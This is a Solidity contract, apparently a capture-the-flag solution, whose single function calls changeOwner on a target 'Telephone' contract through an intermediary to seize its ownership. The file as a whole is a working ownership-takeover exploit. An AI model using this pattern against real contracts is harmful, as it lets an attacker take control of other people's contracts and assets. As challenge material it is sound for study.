// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attacker {
    function claimOwnerShip(address _targetAddress) public {
        Telephone target = Telephone(_targetAddress);
        target.changeOwner(msg.sender);
    }
}
